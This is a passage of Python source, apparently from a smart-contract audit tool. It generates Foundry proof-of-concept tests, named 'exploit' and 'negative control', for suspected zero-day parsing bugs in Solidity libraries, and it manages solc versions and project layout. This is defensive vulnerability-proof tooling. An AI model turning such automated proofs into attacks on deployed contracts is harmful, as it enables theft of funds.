        src: str, internal_fn: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """If `internal_fn` is an ERC4626 hook OVERRIDE in a contract that inherits an
    ERC4626 base, return a SYNTHETIC public-entrypoint fn dict (the canonical
    `deposit`/`mint`/`withdraw`/`redeem` the OZ base routes through `super` to the
    override). Returns None otherwise. GENERIC: matched by the ERC4626 inheritance
    + the standard hook name + an `override` on the cited hook, no target literal.

    The synthetic wrapper carries the standard public entrypoint SIGNATURE so the
    downstream author drives it directly (`deposit(uint256,address)` etc.); the
    real bug is still in the in-tree override the base calls via super."""
    name = internal_fn["name"]
    entry = _ERC4626_HOOK_TO_ENTRYPOINT.get(name)
    if entry is None:
        return None
    code = _strip_comments(src)
    # the unit must inherit an ERC4626 base (the indirection only holds for an
    # ERC4626 descendant whose public entrypoint lives in the base).
    inherits_erc4626 = bool(_ERC4626_INHERIT_DECL_RE.search(code)
                            or re.search(r"\bERC4626(?:Upgradeable)?\b", code))
    if not inherits_erc4626:
        return None
    # the cited hook must actually be an OVERRIDE (it specializes the base hook
    # the public entrypoint dispatches into). A non-override `_deposit` would be a
    # plain in-contract helper handled by the textual-call binder above.
    hook_decl = re.search(
        rf"function\s+{re.escape(name)}\s*\(([^)]*)\)[^{{;]*\boverride\b", code)
    if hook_decl is None:
        return None
    # standard public entrypoint signatures the OZ ERC4626 base exposes.
    entry_params = {
        "deposit": "uint256 assets, address receiver",
        "mint": "uint256 shares, address receiver",
        "withdraw": "uint256 assets, address receiver, address owner",
        "redeem": "uint256 shares, address receiver, address owner",
    }[entry]
    return {"name": entry, "params": entry_params, "visibility": "public",
            "mutability": "", "returns": "uint256",
            "start_line": internal_fn.get("start_line", 0),
            "body_start": internal_fn.get("body_start", 0),
            "oz_indirected": True}


def _constructor_params(src: str, unit_name: str) -> Optional[str]:
    """Return the raw constructor param string for the named unit, or None if no
    explicit constructor (defaults to empty). Anchored to the contract
    DECLARATION (`... contract <unit> {`) and constrained to a real ctor
    signature (params + modifier list with no embedded `{`/`}`/`;`) so a
    'constructor' word in a NatSpec comment above the contract is not mistaken
    for the real ctor."""
    decl = re.search(rf"\b(?:contract|abstract\s+contract)\s+{re.escape(unit_name)}\b",
                     src)
    body_start = decl.end() if decl else src.find(unit_name)
    if body_start < 0:
        return None
    m = re.search(r"\bconstructor\s*\(([^){};]*)\)[^{};]*\{", src[body_start:])
    if m:
        return m.group(1).strip()
    return None


_VALUE_TYPE_DEFAULTS = {
    "address": "address(0xBEEF)",
    "bool": "false",
    "uint256": "1",
    "uint": "1",
    "int256": "1",
    "int": "1",
    "bytes32": "bytes32(0)",
    "bytes4": "bytes4(0)",
    "string": '""',
    "bytes": '""',
}


def _synthesize_ctor_args(params: str) -> Optional[str]:
    """Best-effort synthesize a comma-separated ctor arg list from the param
    signature. Returns None if any param is a non-synthesizable type (struct,
    interface, array, mapping, custom contract type)."""
    params = (params or "").strip()
    if not params:
        return ""
    args = []
    for p in params.split(","):
        p = p.strip()
        if not p:
            continue
        typ = p.split()[0]
        base = re.sub(r"\d+$", lambda mm: mm.group(0), typ)  # keep uintN
        # normalize uintN/intN to defaults
        if re.fullmatch(r"uint\d*", typ):
            args.append("1")
        elif re.fullmatch(r"int\d*", typ):
            args.append("1")
        elif typ in _VALUE_TYPE_DEFAULTS:
            args.append(_VALUE_TYPE_DEFAULTS[typ])
        elif re.fullmatch(r"bytes\d+", typ):
            args.append(f"{typ}(0)")
        else:
            # struct / interface / array / custom type: not synthesizable
            return None
    return ", ".join(args)


# --- per-class real-input authors (pure-library) ----------------------------
#
# Each returns (exploit_body, control_body, patched_lib_src). The harness imports
# the REAL library; the patched library is a corrected copy of just the cited fn
# so the negative control is a true clean baseline.

def _author_decode_mismatch(unit: str, fn: Dict[str, Any], cited_line: str
                            ) -> Optional[Dict[str, str]]:
    """decode-mismatch defects are byte/RLP/bounds parsing bugs in pure fns.
    We author a value-conflation / bounds adversarial input against the REAL fn
    and a corrected patched fn as the negative control. Only handles the two
    known shapes; returns None otherwise (caller falls back to blocked)."""
    name = fn["name"]
    params = fn["params"]
    rets = fn["returns"]
    # Shape A: isEmpty(bytes) -> bool  (RLP empty-list/empty-string conflation)
    if name == "isEmpty" and "bytes" in params and "bool" in rets:
        exploit = f"""\
        // EXPLOIT: drive the REAL {unit}.{name} (cited at {cited_line}).
        // A legitimate 1-byte stored value (decoded payload 0xc0 or 0x80) is
        // mis-classified as ABSENT, silently dropping a real value on decode.
        bytes memory legit_c0 = hex"c0";
        bytes memory legit_80 = hex"80";
        bytes memory nonEmpty = hex"42";
        assertTrue(real.{name}(legit_c0), "BUG: real {name} drops legit value 0xc0");
        assertTrue(real.{name}(legit_80), "BUG: real {name} drops legit value 0x80");
        assertFalse(real.{name}(nonEmpty), "0x42 must be non-empty");"""
        control = f"""\
        // NEGATIVE CONTROL: corrected {name} treats absence as length==0 ONLY,
        // so the same legit 1-byte values are correctly preserved.
        bytes memory legit_c0 = hex"c0";
        bytes memory legit_80 = hex"80";
        bytes memory trulyEmpty = hex"";
        assertFalse(patched.{name}(legit_c0), "patched still dropped 0xc0");
        assertFalse(patched.{name}(legit_80), "patched still dropped 0x80");
        assertTrue(patched.{name}(trulyEmpty), "patched must flag genuinely-empty as absent");"""
        patched_fn = f"""\
    function {name}(bytes memory item) internal pure returns (bool) {{
        return item.length == 0; // corrected: value slot is a string; absent <=> empty
    }}"""
        return {"exploit": exploit, "control": control, "patched_fn": patched_fn}
    # Shape B: removeEndingZero(bytes)/removeLeadingZero(bytes) unsigned underflow
    if name in ("removeEndingZero",) and "bytes" in params:
        exploit = f"""\
        // EXPLOIT: drive the REAL {unit}.{name} (cited at {cited_line}) with an
        // all-zero input. The unsigned loop index underflows (i-- past 0 / or
        // length-1 with length 0), causing an out-of-gas / revert -> a parsing
        // input the verifier should handle reverts instead.
        bytes memory allZero = hex"0000";
        vm.expectRevert();
        real.{name}(allZero);"""
        control = f"""\
        // NEGATIVE CONTROL: corrected {name} handles the all-zero input without
        // underflow and returns empty bytes.
        bytes memory allZero = hex"0000";
        bytes memory out = patched.{name}(allZero);
        assertEq(out.length, 0, "patched must return empty for all-zero input");"""
        patched_fn = f"""\
    function {name}(bytes memory data) internal pure returns (bytes memory) {{
        // corrected: scan with a signed/guarded index, no unsigned underflow
        if (data.length == 0) return data;
        uint256 endIndex = type(uint256).max;
        for (uint256 i = data.length; i > 0; i--) {{
            if (data[i - 1] != 0) {{ endIndex = i - 1; break; }}
        }}
        if (endIndex == type(uint256).max) return new bytes(0);
        bytes memory out = new bytes(endIndex + 1);
        for (uint256 j = 0; j <= endIndex; j++) out[j] = data[j];
        return out;
    }}"""
        return {"exploit": exploit, "control": control, "patched_fn": patched_fn}
    return None


def author_pure_library_proof(candidate: Dict[str, Any], src: str,
                              unit_name: str, fn: Dict[str, Any],
                              rel_import: str) -> Optional[Dict[str, str]]:
    """Author a self-contained, real-import, run-backed PoC for a pure-library
    defect. Returns {"test_src": <solidity>, "test_match": <regex>} or None."""
    vc = candidate["vuln_class"]
    cited = candidate.get("file_line", "")
    pragma = _read_pragma(src)
    bodies = None
    if vc == "decode-mismatch":
        bodies = _author_decode_mismatch(unit_name, fn, cited)
    if bodies is None:
        return None
    fnname = fn["name"]
    params = fn["params"]
    rets = fn["returns"] or "bool"
    # The harness exposes the REAL internal fn via an external wrapper, plus a
    # patched library with ONLY the corrected fn as the negative control.
    test_src = f"""// SPDX-License-Identifier: MIT
pragma solidity {pragma};

// AUTO-GENERATED by tools/evm-0day-proof-pipeline.py (real run-backed proof).
// V3-GRADE PoC (Rule 40): drives the REAL in-tree library function; the
// negative control is a corrected copy of the SAME function. No protocol-owned
// path is mocked; the real defect is exercised directly.
//
// Candidate: {unit_name}.{fnname} vuln_class={vc} at {cited}

import {{Test}} from "forge-std/Test.sol";
import {{{unit_name}}} from "{rel_import}";

// Harness over the REAL in-tree library (audit-pin source, unmodified).
contract RealHarness {{
    function {fnname}({params}) external pure returns ({rets}) {{
        return {unit_name}.{fnname}({_fwd_args(params)});
    }}
}}

// PATCHED library: corrected copy of ONLY the cited fn (negative control).
library {unit_name}_Patched {{
{bodies['patched_fn']}
}}
contract PatchedHarness {{
    function {fnname}({params}) external pure returns ({rets}) {{
        return {unit_name}_Patched.{fnname}({_fwd_args(params)});
    }}
}}

contract {unit_name}_{fnname}_ZeroDay is Test {{
    RealHarness real;
    PatchedHarness patched;

    function setUp() public {{
        real = new RealHarness();
        patched = new PatchedHarness();
    }}

    function test_exploit_{fnname}() public {{
{bodies['exploit']}
    }}

    function test_negative_control_{fnname}() public {{
{bodies['control']}
    }}
}}
"""
    return {"test_src": test_src,
            "test_match": f"test_(exploit|negative_control)_{fnname}"}


def _fwd_args(params: str) -> str:
    """Forward the harness param names to the inner library call."""
    params = (params or "").strip()
    if not params:
        return ""
    names = []
    for p in params.split(","):
        p = p.strip()
        if not p:
            continue
        toks = p.split()
        names.append(toks[-1])  # last token is the param name
    return ", ".join(names)


# --- self-contained runner --------------------------------------------------

def build_self_contained_runner(real_src_root: Path, real_src_subdir: str,
                                forge_std: Path, test_src: str,
                                pragma_solc: str) -> Optional[Path]:
    """Create a temp foundry project that imports the REAL src tree and a
    vendored forge-std, write the authored test, return the project dir.

    real_src_root  : the workspace checkout root containing the contract.
    real_src_subdir: the directory under the root used as the import prefix
                     (we symlink it at the project root under the SAME name so
                     the target's relative imports resolve unchanged).
    """
    import tempfile
    proj = Path(tempfile.mkdtemp(prefix="evm0day_run_"))
    (proj / "test").mkdir(parents=True, exist_ok=True)
    (proj / "lib").mkdir(parents=True, exist_ok=True)
    # vendor forge-std
    try:
        os.symlink(forge_std, proj / "lib" / "forge-std")
    except OSError:
        import shutil
        shutil.copytree(forge_std, proj / "lib" / "forge-std")
    # symlink the real src subdir at the project root under the same name
    src_link = proj / real_src_subdir
    src_link.parent.mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(real_src_root / real_src_subdir, src_link)
    except OSError:
        return None
    # pin solc to a concrete version compatible with the pragma
    solc = _pick_solc(pragma_solc)
    # COMMON-LIBRARY vendoring: the symlinked REAL src subtree (not just the
    # authored test) may import solmate / OpenZeppelin; vendor those well-known
    # libraries so the target's own imports resolve. We scan the test PLUS the
    # symlinked subtree for the common-lib prefixes.
    scan_blob = test_src
    try:
        real_dir = real_src_root / real_src_subdir
        for sol in real_dir.rglob("*.sol"):
            try:
                scan_blob += "\n" + sol.read_text(errors="ignore")
            except OSError:
                continue
    except OSError:
        pass
    remaps = ["forge-std/=lib/forge-std/src/"]
    common = _synthesize_common_lib_remappings(scan_blob, forge_std)
    if common is not None:
        remaps = [f"{prefix}={path.as_posix()}/" for prefix, path in common.items()]
    rm_list = "[" + ", ".join(f"'{r}'" for r in remaps) + "]"
    (proj / "foundry.toml").write_text(
        "[profile.default]\n"
        f"solc = '{solc}'\n"
        f"src = '{real_src_subdir}'\n"
        "out = 'out'\n"
        "test = 'test'\n"
        f"remappings = {rm_list}\n"
    )
    (proj / "test" / "ZeroDay.t.sol").write_text(test_src)
    return proj


def build_standalone_runner(forge_std: Path, test_src: str,
                            pragma_solc: str) -> Optional[Path]:
    """Create a temp foundry project that compiles ONLY the authored test +
    vendored forge-std. Used for FAITHFUL SELF-CONTAINED reproductions that
    import nothing from the real (deep-graph) src tree, so forge never has to
    resolve the target's deep dependency graph. Returns the project dir."""
    import tempfile
    proj = Path(tempfile.mkdtemp(prefix="evm0day_standalone_"))
    (proj / "test").mkdir(parents=True, exist_ok=True)
    (proj / "src").mkdir(parents=True, exist_ok=True)
    (proj / "lib").mkdir(parents=True, exist_ok=True)
    try:
        os.symlink(forge_std, proj / "lib" / "forge-std")
    except OSError:
        import shutil
        shutil.copytree(forge_std, proj / "lib" / "forge-std")
    solc = _pick_solc(pragma_solc)
    # COMMON-LIBRARY vendoring (generalizes the forge-std mechanism): when the
    # authored standalone test imports solmate / OpenZeppelin, vendor those
    # well-known libraries from a sibling checkout and synthesize the remappings
    # so solc resolves them. forge-std is always remapped to the vendored copy.
    remaps = ["forge-std/=lib/forge-std/src/"]
    common = _synthesize_common_lib_remappings(test_src, forge_std)
    if common is not None:
        remaps = [f"{prefix}={path.as_posix()}/" for prefix, path in common.items()]
    rm_list = "[" + ", ".join(f"'{r}'" for r in remaps) + "]"
    (proj / "foundry.toml").write_text(
        "[profile.default]\n"
        f"solc = '{solc}'\n"
        "src = 'src'\n"
        "out = 'out'\n"
        "test = 'test'\n"
        f"remappings = {rm_list}\n"
    )
    (proj / "test" / "ZeroDay.t.sol").write_text(test_src)
    return proj


# Where solc binaries are installed across the common managers. Covers both the
# `<store>/0.8.X/` flat layout (svm / solc-select) and the `<store>/0.8/0.8.X/`
# nested layout (foundry svm). The version dir name is always `0.8.X`.
_SOLC_STORE_DIRS = (
    Path.home() / ".svm",
    Path.home() / ".svm" / "versions",
    Path.home() / ".foundry" / "svm" / "0.8",
    Path.home() / ".solc-select" / "artifacts",
)


def _installed_solc_minors() -> List[int]:
    """Return the installed 0.8.x solc minors (across the common solc stores),
    sorted ascending. Empty when no store is found. Used so the authored test
    pragma DERIVES a version the repo's solc set can actually compile (GAP B): a
    hardcoded `0.8.28` fails with `No solc version exists that matches =0.8.28`
    when only a different minor is installed.

    A dir name is counted as installed when it is `0.8.X` (svm/solc-select flat
    layout, foundry svm nested layout) OR `solc-0.8.X` (solc-select artifact dir).
    """
    minors: set = set()
    for base in _SOLC_STORE_DIRS:
        if not base.is_dir():
            continue
        try:
            children = list(base.iterdir())
        except OSError:
            continue
        for child in children:
            if not child.is_dir():
                continue
            m = re.fullmatch(r"(?:solc-)?0\.8\.(\d+)", child.name)
            if m:
                minors.add(int(m.group(1)))
    return sorted(minors)


# Fallback default minor when no installed-solc store is found and the pragma is
# an open caret/range. Kept as a single named constant (not scattered literals)
# so the GAP-B derivation has one place to change.
_DEFAULT_08_MINOR = 28


def _read_project_solc_pin(project: Optional[Path]) -> Optional[str]:
    """Return the EXACT solc version the project's foundry.toml pins (the
    `[profile.default] solc = '...'` or `solc_version = '...'` directive), or None
    when the project has no foundry.toml / no solc pin. This is the AUTHORITATIVE
    pin (GAP-B+1): forge run in-place against the project uses this solc, so the
    authored test pragma must be COMPATIBLE with it - a project that pins
    `solc = '0.8.21'` cannot compile a test pinned to `0.8.35` even when 0.8.35 is
    the highest installed. Only a concrete `0.8.X` pin is returned; an open
    range pin (`^0.8.X` / `>=...`) is NOT a hard pin and is left to source-pragma
    resolution. GENERIC: reads any foundry project's toml, no target literal."""
    if project is None:
        return None
    toml = project / "foundry.toml"
    if not toml.exists():
        return None
    try:
        tomltext = toml.read_text(errors="ignore")
    except OSError:
        return None
    m = re.search(r"(?m)^\s*solc(?:_version)?\s*=\s*['\"]([^'\"]+)['\"]", tomltext)
    if not m:
        return None
    pin = m.group(1).strip()
    # only treat a CONCRETE `=0.8.X` / bare `0.8.X` pin as authoritative; an open
    # caret/range in foundry.toml leaves the choice to the source pragma.
    if ("^" in pin) or (">=" in pin) or ("<" in pin) or ("~" in pin) or (" " in pin):
        return None
    vm = re.fullmatch(r"=?\s*(0\.8\.\d+)", pin)
    return vm.group(1) if vm else None


def _solc_version_installed(version: str) -> bool:
    """True when the exact `0.8.X` solc `version` is present in any common solc
    store (svm / solc-select / foundry svm). Used to decide between honoring a
    project pin directly vs. attempting a bounded install vs. emitting a precise
    compile-blocked-with-obligation."""
    m = re.fullmatch(r"0\.8\.(\d+)", version or "")
    if not m:
        return False
    return int(m.group(1)) in set(_installed_solc_minors())


def _attempt_svm_install(version: str, timeout: int = 180) -> bool:
    """Best-effort bounded install of an exact `0.8.X` solc via svm/solc-select so
    a project-pinned solc the test env is missing can still be satisfied. Returns
    True only when the version is present AFTER the attempt. Never raises; an
    unavailable installer simply returns False and the caller emits a precise
    compile-blocked-with-obligation naming the missing solc (it does NOT silently
    fall back to a different version the project rejects). Env-disable hook:
    AUDITOOOR_EVM0DAY_NO_SVM_INSTALL=1 short-circuits the install attempt (used by
    the test env to exercise the blocked-with-obligation path deterministically)."""
    if _solc_version_installed(version):
        return True
    if not re.fullmatch(r"0\.8\.\d+", version or ""):
        return False
    if os.environ.get("AUDITOOOR_EVM0DAY_NO_SVM_INSTALL"):
        return False
    # try svm-rs then solc-select; both no-op gracefully when absent.
    for cmd in (["svm", "install", version], ["solc-select", "install", version]):
        bin_name = cmd[0]
        try:
            if subprocess.run(["which", bin_name],
                              capture_output=True).returncode != 0:
                continue
            subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        except Exception:
            continue
        if _solc_version_installed(version):
            return True
    return _solc_version_installed(version)


def _preflight_project_solc(project: Optional[Path]) -> Optional[Dict[str, Any]]:
    """GAP-B+1 run-time preflight: when the in-place foundry project pins a
    CONCRETE solc (`solc = '0.8.X'`) that is NOT installed, attempt a bounded
    svm/solc-select install of THAT EXACT version; if it still cannot be made
    available, return a precise compile-blocked-with-obligation dict naming the
    missing solc. Return None when there is no concrete pin or the pinned solc is
    (now) available - the caller then runs forge normally. The pipeline must NEVER
    silently fall back to a different solc that the project's foundry.toml rejects;
    the honest outcome of an un-installable project pin is blocked-with-obligation,
    not a wrong-solc run. GENERIC: no target literal."""
    pin = _read_project_solc_pin(project)
    if pin is None:
        return None
    if _attempt_svm_install(pin):
        return None
    return {"verdict": "compile-blocked-with-obligation",
            "reason": f"the foundry project pins solc = '{pin}' (foundry.toml "
                      "[profile.default]) but that exact solc is not installed in "
                      "this environment and a bounded svm/solc-select install of it "
                      "was unavailable; running forge against a different solc would "
                      "be rejected by the project pin, so the proof is honestly "
                      "blocked rather than run under the wrong compiler.",
            "obligation": f"install solc {pin} (e.g. `svm install {pin}` or "
                          f"`solc-select install {pin}`) so forge can compile the "
                          "authored test under the project-pinned compiler, then "
                          "re-run the proof."}


def _pick_solc(pragma: str) -> str:
    """Pick a concrete solc version satisfying the pragma, preferring an INSTALLED
    version (GAP B). For a pinned `=0.8.X` / bare `0.8.X` the exact minor is used.
    For an open `^0.8.X` / `>=0.8.X` range, the HIGHEST installed minor that is
    >= the floor is chosen (so the repo's real solc set compiles the authored
    test); when no install store is visible it falls back to the floor (caret) or
    the named default."""
    m = re.search(r"0\.8\.(\d+)", pragma or "")
    if not m:
        installed = _installed_solc_minors()
        return f"0.8.{installed[-1]}" if installed else f"0.8.{_DEFAULT_08_MINOR}"
    minor = int(m.group(1))
    is_open = ("^" in (pragma or "")) or (">=" in (pragma or ""))
    installed = _installed_solc_minors()
    if not is_open:
        # pinned (`=0.8.X` or bare `0.8.X`): the exact minor is required.
        return f"0.8.{minor}"
    # open range: pick the highest installed minor at/above the floor; else floor.
    if installed:
        at_or_above = [x for x in installed if x >= minor]
        if at_or_above:
            return f"0.8.{at_or_above[-1]}"
        # nothing installed at/above the floor: use the highest installed (it may
        # still satisfy a `>=` floor only when >= minor, else fall to floor).
        return f"0.8.{installed[-1]}" if installed[-1] >= minor else f"0.8.{minor}"
    return f"0.8.{minor}"


def _derive_test_pragma(src: str, project: Optional[Path] = None) -> str:
    """Derive the authored test's `pragma solidity X;` version FROM the cited
    source / repo (GAP B / GAP-B+1), NOT a hardcoded literal.

    PRECEDENCE (sandclock-closest +1 fix): the project foundry.toml `solc` pin is
    AUTHORITATIVE and wins FIRST, because forge run in-place uses that solc to
    compile the authored test - a project pinned to `solc = '0.8.21'` cannot
    satisfy a test pinned to `0.8.35` (the empirical sandclock scLiquity blocker:
    source pragma -> highest installed `=0.8.35` while foundry.toml pins
    `solc = '0.8.21'` -> forge `No solc version exists that matches =0.8.35`).
    Resolution order is therefore:
      (1) the project foundry.toml `solc = '...'` CONCRETE pin (authoritative);
      (2) the cited source file's own pragma, resolved to a concrete INSTALLED
          solc via `_pick_solc` (so a pinned `=0.8.32` does not silently become
          `0.8.28`);
      (3) the named default minor via `_pick_solc` on the source pragma.

    The project pin is honored verbatim: when the source pragma allows the pin
    (open range covering it, or an exact match) the authored test pins the EXACT
    project solc; when the source pragma is a CONFLICTING hard pin a warning-free
    project-pin-wins is still applied (the in-place forge run is governed by the
    project pin, so authoring against it is the only compilable choice). Whether
    the project-pinned solc is actually installable is handled at run time by
    `_attempt_svm_install` + a precise compile-blocked-with-obligation; this
    derivation only decides the pragma VERSION."""
    # (1) project foundry.toml CONCRETE solc pin wins first (authoritative).
    project_pin = _read_project_solc_pin(project)
    if project_pin is not None:
        return project_pin
    # only treat the source pragma as authoritative when the source ACTUALLY
    # declares one (_read_pragma returns a default when none is present, which we
    # must NOT mistake for a real pin).
    has_real_pragma = bool(_PRAGMA_RE.search(src or ""))
    if has_real_pragma:
        src_pragma = _read_pragma(src)
        if re.search(r"0\.8\.\d+", src_pragma or ""):
            return _pick_solc(src_pragma)
    # (3) fall back through _pick_solc on the source pragma (or its default).
    return _pick_solc(_read_pragma(src))


# --- in-place foundry runner (for deep-dep contracts that already build) ----

def find_enclosing_foundry_project(src_file: Path, workspace: Path) -> Optional[Path]:
    """Resolve the foundry project whose remappings + installed deps already
    resolve the real contract's deep import graph, so we author the test INTO its
    test dir and run forge in-place.

    Resolution order:
      (1) ANCESTOR walk: the nearest dir at/above the cited source file that
          contains a foundry.toml (within the workspace). This is the normal
          case (the cited file lives inside the foundry project).
      (2) PROVISIONED-REPO / SIBLING-SUBTREE fallback (GAP A): when the workspace
          was provisioned by fresh-target-forward-test.py, the real repo (with
          its foundry.toml) is cloned to <ws>/repo while the in-scope src/ is
          MIRRORED to <ws>/src. The cited file then lives under the MIRROR
          (<ws>/src/...), whose ancestors contain no foundry.toml - the real
          foundry.toml is in a SIBLING subtree (<ws>/repo). The ancestor walk
          therefore returns None and the proof short-circuits to
          blocked-with-obligation before forge ever runs. This fallback resolves
          the PROVISIONED REPO's foundry project so remappings/lib resolve and
          the proof is authored INSIDE the real foundry project.

    GENERIC: no target literal. The provisioned-repo hint is recognized by the
    canonical provisioning markers (<ws>/repo, AUDIT_PIN.txt, targets.tsv) the
    in-tree provisioner writes; the sibling search is a bounded scan for the
    nearest foundry.toml under the workspace, never a named directory.
    """
    cur = src_file.parent
    ws = workspace.resolve()
    # (1) ancestor walk (normal case).
    while True:
        if (cur / "foundry.toml").exists():
            return cur
        if cur == ws or cur.parent == cur:
            break
        cur = cur.parent
    # (2) provisioned-repo / sibling-subtree fallback (GAP A).
    return _find_provisioned_foundry_project(src_file, ws)


def _find_provisioned_foundry_project(src_file: Path, ws: Path) -> Optional[Path]:
    """When the cited source lives under a MIRRORED src tree (the
    fresh-target-forward-test in-tree provision layout: real repo at <ws>/repo,
    in-scope src mirrored to <ws>/src), the real foundry.toml is in a SIBLING
    subtree, not an ancestor of the mirror. Resolve the PROVISIONED REPO's
    foundry project so the authored proof compiles inside the real project's
    remappings/lib graph. Returns None when no provisioned sibling foundry
    project is found (caller keeps the honest blocked-with-obligation path).

    Strategy (all bounded, target-literal-free):
      (a) the canonical provisioned-repo dir: <ws>/repo with a foundry.toml at
          its root or one level down (monorepo packages/<x>).
      (b) any other SIBLING subtree under <ws> (excluding the mirror that
          contains src_file, and build-artifact dirs) whose root holds a
          foundry.toml.
    Only consulted when a provisioning marker is present (<ws>/repo OR
    <ws>/AUDIT_PIN.txt OR <ws>/targets.tsv) so an unprovisioned, genuinely
    source-only workspace still resolves to None and blocks honestly.
    """
    try:
        ws = ws.resolve()
        src_file = src_file.resolve()
    except OSError:
        return None
    # require a provisioning marker so an ordinary source-only ws is unaffected.
    provisioned = (
        (ws / "repo").is_dir()
        or (ws / "AUDIT_PIN.txt").exists()
        or (ws / "targets.tsv").exists()
    )
    if not provisioned:
        return None
    # the mirror subtree that owns the cited file (so we don't re-pick it).
    try:
        rel_parts = src_file.relative_to(ws).parts
    except ValueError:
        return None
    mirror_top = (ws / rel_parts[0]) if rel_parts else None

    def _foundry_root_near(base: Path) -> Optional[Path]:
        """foundry.toml at `base` root, or one package level down."""
        if (base / "foundry.toml").exists():
            return base
        # monorepo: packages/<pkg>/foundry.toml, contracts/<pkg>/foundry.toml.
        for sub in sorted(base.iterdir()) if base.is_dir() else []:
            if not sub.is_dir() or sub.name in _BUILD_ARTIFACT_DIRS:
                continue
            if (sub / "foundry.toml").exists():
                return sub
        return None

    # (a) canonical provisioned-repo dir first.
    repo_dir = ws / "repo"
    if repo_dir.is_dir():
        hit = _foundry_root_near(repo_dir)
        if hit is not None:
            return hit

    # (b) bounded scan of OTHER sibling subtrees for the nearest foundry.toml,
    # preferring the shallowest one (the project root, not a nested lib/example).
    best: Optional[Path] = None
    best_depth = 1 << 30
    for toml in ws.rglob("foundry.toml"):
        proj = toml.parent
        # skip the mirror subtree that owns the cited file (it has no real
        # foundry project; if it did the ancestor walk would have found it).
        if mirror_top is not None and (proj == mirror_top
                                       or mirror_top in proj.parents):
            continue
        # skip foundry.toml inside build-artifact / dependency dirs.
        if any(part in _BUILD_ARTIFACT_DIRS for part in proj.relative_to(ws).parts):
            continue
        depth = len(proj.relative_to(ws).parts)
        if depth < best_depth:
            best, best_depth = proj, depth
    return best


def _resolve_src_file_in_project(src_file: Path, project: Path) -> Path:
    """GAP A: when the cited source lives under a MIRROR subtree (the provisioned
    layout: real repo at <ws>/repo with its own src copy, mirror at <ws>/src) the
    resolved foundry project is the SIBLING repo, NOT an ancestor of the mirror
    file. Authoring the proof with an import computed from the MIRROR path emits a
    `../../../..` import that escapes the project root, so forge cannot compile
    the cited contract. Re-resolve the cited file to the PROJECT's OWN copy so the
    authored import stays inside the project tree and remappings/lib resolve.

    When `src_file` is already under `project`, the ORIGINAL `src_file` is
    returned UNCHANGED (not re-resolved) so the caller's relative-import math
    against an equally-unresolved test dir stays clean. When the project has its
    own copy of the cited file (same relative subpath preferred, else same
    basename), that copy is returned. When no copy is found (the mirror diverged),
    the original `src_file` is returned unchanged (the caller's import then
    escapes the project root and forge reports the honest compile block - no fake
    proof).
    """
    try:
        rsrc = src_file.resolve()
        rproj = project.resolve()
    except OSError:
        return src_file
    # already inside the project tree: return the ORIGINAL path unchanged so the
    # caller's import-relpath math is not perturbed (the normal in-repo case).
    if rproj == rsrc or rproj in rsrc.parents:
        return src_file
    name = rsrc.name
    # prefer the project copy whose tail path matches the most cited-path segments
    # (so packages/x/src/A.sol is chosen over a same-named file elsewhere).
    src_parts = rsrc.parts
    best: Optional[Path] = None
    best_overlap = -1
    for cand in rproj.rglob(name):
        if not cand.is_file():
            continue
        if any(part in _BUILD_ARTIFACT_DIRS
               for part in cand.relative_to(rproj).parts):
            continue
        cparts = cand.parts
        overlap = 0
        for a, b in zip(reversed(src_parts), reversed(cparts)):
            if a == b:
                overlap += 1
            else:
                break
        if overlap > best_overlap:
            best, best_overlap = cand, overlap
    return best if best is not None else src_file


def _project_test_dir(project: Path) -> Path:
    """Read foundry.toml for `test = '<dir>'`, default tests/foundry or test."""
    toml = (project / "foundry.toml").read_text(errors="ignore")
    m = re.search(r"(?m)^\s*test\s*=\s*['\"]([^'\"]+)['\"]", toml)
    if m:
        return project / m.group(1)
    for d in ("tests/foundry", "test", "tests"):
        if (project / d).exists():
            return project / d
    return project / "test"


# --- non-standard-layout remapping synthesis (iter14-A) --------------------
# Some real Foundry/Hardhat hybrid projects (e.g. strata) ship NO installed
# deps (`node_modules`/`lib` absent) and NO remappings.txt, so the real
# contract's `@openzeppelin/...` and `forge-std/...` imports do not resolve
# in-place. When that happens we VENDOR a version-compatible OZ + forge-std
# checkout from a sibling workspace and synthesize a minimal remappings.txt so
# `forge test` resolves the REAL protocol dep graph naturally (no mock replaces
# a protocol type). The synthesis is NON-DESTRUCTIVE: any pre-existing
# remappings.txt is backed up and restored afterward.

_OZ_LIB_GLOBS = [
    "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC4626.sol",
    "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol",
]

# Env disable hook (mirrors AUDITOOOR_FORGE_STD / AUDITOOOR_EVM0DAY_NO_SVM_INSTALL):
# when set, the common-library (solmate / OZ) sibling vendoring is suppressed so
# the gate degrades to an honest blocked-with-obligation rather than vendoring.
_NO_COMMON_LIB_VENDOR_ENV = "AUDITOOOR_EVM0DAY_NO_COMMON_LIB_VENDOR"


def _common_lib_vendor_disabled() -> bool:
    return bool(os.environ.get(_NO_COMMON_LIB_VENDOR_ENV))


def _solmate_src_is_valid(src_dir: Path) -> bool:
    """A solmate `src/` root is usable when it ships the canonical entry files the
    common-library consumers import (tokens/ERC20 + utils/SafeTransferLib +
    utils/FixedPointMathLib + mixins/ERC4626)."""
    return (
        (src_dir / "tokens" / "ERC20.sol").exists()
        and (src_dir / "utils" / "SafeTransferLib.sol").exists()
        and (src_dir / "utils" / "FixedPointMathLib.sol").exists()
        and (src_dir / "mixins" / "ERC4626.sol").exists()
    )


# FIX 2: the previous code re-ran a full `~/audits` rglob on EVERY harness-author
# call (100+ per suite); each walk crosses morpho's dozens of deeply-nested
# `lib/.../lib/<lib>` vendoring trees (~53k dirs), so the suite spent minutes
# re-walking. The dominant fix is the per-process CACHE below (one walk per
# process, reused by every later call). The walk itself is additionally bounded -
# heavy build/vcs subtrees are pruned in-place and a runaway DEPTH / DIR-count
# guard caps a pathological tree - but those bounds are set GENEROUSLY so they
# never truncate real discovery: the lone OZ-5.x-upgradeable sibling currently
# lives at a depth-7 marker reached ~15k dirs in, and both bounds sit well past
# that. Lowering them is an env-tunable escape hatch, not the default behavior.
_SIBLING_SCAN_MAX_DEPTH = int(os.environ.get("AUDITOOOR_SIBLING_SCAN_MAX_DEPTH", "16"))
_SIBLING_SCAN_MAX_DIRS = int(os.environ.get("AUDITOOOR_SIBLING_SCAN_MAX_DIRS", "200000"))
_SIBLING_SCAN_PRUNE = {".git", "node_modules", ".cache", "target",
                       "out", "cache", "artifacts", "broadcast", "coverage"}
